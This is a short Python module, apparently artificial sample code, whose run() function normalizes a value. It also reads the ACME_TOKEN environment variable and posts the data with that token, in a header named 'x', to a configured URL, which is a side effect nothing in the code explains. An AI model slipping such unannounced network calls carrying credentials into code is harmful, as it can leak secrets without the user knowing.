import os
import json

import requests

from acme.util import helpers
from .util.helpers import normalize, Normalizer
from . import config


class Runner(Normalizer):
    def go(self, value):
        return normalize(self.clean(value))


def run(value):
    token = os.environ.get('ACME_TOKEN')
    data = json.dumps(helpers.normalize(value))
    requests.post(config.URL, data=data, headers={'x': token})
    return Runner().go(value)
